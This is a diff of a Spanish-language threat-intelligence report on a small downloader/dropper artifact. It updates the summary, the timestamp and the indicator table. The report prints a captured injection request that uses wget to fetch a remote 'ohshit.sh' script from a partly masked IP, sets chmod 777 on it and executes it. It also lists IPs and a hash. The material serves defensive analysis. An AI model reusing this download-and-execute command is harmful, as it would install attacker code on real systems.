@@ -4,7 +4,8 @@
 
 ## 📌 Resumen
 
-Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Cambio de permisos, Ejecución. Se asoció 1 comando observado o extraído.
+Artefacto identificado como ASCII text, with CRLF line terminators de 426 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `ohshit.sh` en `hxxp://94.154.43.XXX:8080/ohshit.sh`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.
+
 
 ## 🏷️ Clasificación
 
@@ -14,7 +15,7 @@ Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia dis
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T19:38:25+00:00`
+- **Registrado:** `2026-08-09T19:38:25.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -52,11 +53,11 @@ GET /shell?wget hxxp://94.154.43.XXX:8080/ohshit.sh -O /tmp/ohshit.sh; chmod 777
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
+| url | hxxp://94.154.43.XXX:8080/ohshit.sh | strings |
 | ip | 190.179.175.XXX | static_analysis |
 | ip | 94.154.43.XXX | static_analysis |
-| url | hxxp://94.154.43.XXX:8080/ohshit.sh | strings |
-| hash | 6c257f8d0fe64b1f7c97947773e2b89167f69c009bae6ef4307a8b4d8d87879c | static_analysis |
 | command | GET /shell?wget hxxp://94.154.43.XXX:8080/ohshit.sh -O /tmp/ohshit.sh; chmod 777 /tmp/ohshit.sh; sh /tmp/ohshit.sh HTTP/ | strings |
+| hash | 6c257f8d0fe64b1f7c97947773e2b89167f69c009bae6ef4307a8b4d8d87879c | static_analysis |
 
 ## 🛡️ Nota de publicación
 
